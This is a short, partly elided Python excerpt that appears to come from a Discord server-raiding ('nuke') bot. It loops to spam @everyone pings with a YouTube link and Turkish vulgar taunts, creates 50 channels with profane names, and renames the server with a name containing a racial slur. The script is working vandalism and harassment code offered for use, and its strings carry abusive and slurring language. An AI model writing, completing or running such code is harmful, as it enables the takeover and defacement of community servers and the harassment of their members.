    ...
    async with aiohttp.ClientSession() as session:
        for i in range(30):
            try:
                ...
                msg = [f"> ||@everyone|| https://youtu.be/NNv2RHR62Rs?si=pcYo5pUNxekaAKoo <", "> ||@everyone|| Vero Baba Siker", "> ||@everyone|| Bu Sunucu Artık Veronica Babanındır!!!!"]
...
""")
    ...
    if select == "1": 
        ...
        await asyncio.gather(*[guild.create_text_channel("F@ucked-by-Veronica") for _ in range(50)])
        await guild.edit(name="VeroNİGAS Siker", description="Veronica Hep Olacaktır!")
